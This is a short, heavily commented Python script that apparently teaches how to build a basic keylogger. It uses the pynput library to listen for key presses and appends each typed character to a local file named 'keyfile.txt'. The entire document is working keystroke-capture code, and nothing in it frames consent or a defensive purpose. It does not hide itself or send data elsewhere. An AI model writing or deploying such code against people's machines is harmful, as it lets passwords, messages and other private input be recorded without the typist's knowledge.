# Import the necessary module
from pynput import keyboard

# Define a function that will be called when a key is pressed
def keyPressed(key):

    # Open a file in append mode to log the pressed keys
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Try to extract the character from the key
            char = key.char

            # Write the character to the log file
            logKey.write(char)
        except:
            # If an error occurs (e.g., special key is pressed), print an error message
            print("Error getting char")

# Check if the script is being directly executed
if __name__ == "__main__":

    # Create a listener object that will trigger the function when a key is pressed
    listener = keyboard.Listener(on_press=keyPressed)
    # Start the listener
    listener.start()
    # This line keeps the program running until you press Enter
    input()